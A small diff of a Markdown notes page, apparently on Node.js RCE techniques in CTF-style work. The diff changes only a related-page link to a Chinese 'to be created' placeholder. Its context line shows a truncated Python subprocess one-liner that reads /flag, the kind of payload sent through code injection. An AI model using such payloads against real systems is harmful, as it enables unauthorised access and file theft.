@@ -41,5 +41,5 @@ python3 -c "import subprocess;f=subprocess.run(['cat','/flag'],capture_output=Tr
 
 ## Connections
 
-- Related: [[nodejs-security]] (future page)
+- Related: *(nodejs-security — 待创建)*
 - GHSA: [[web/ghsa-rce-overview]] (Node.js RCE 模式)
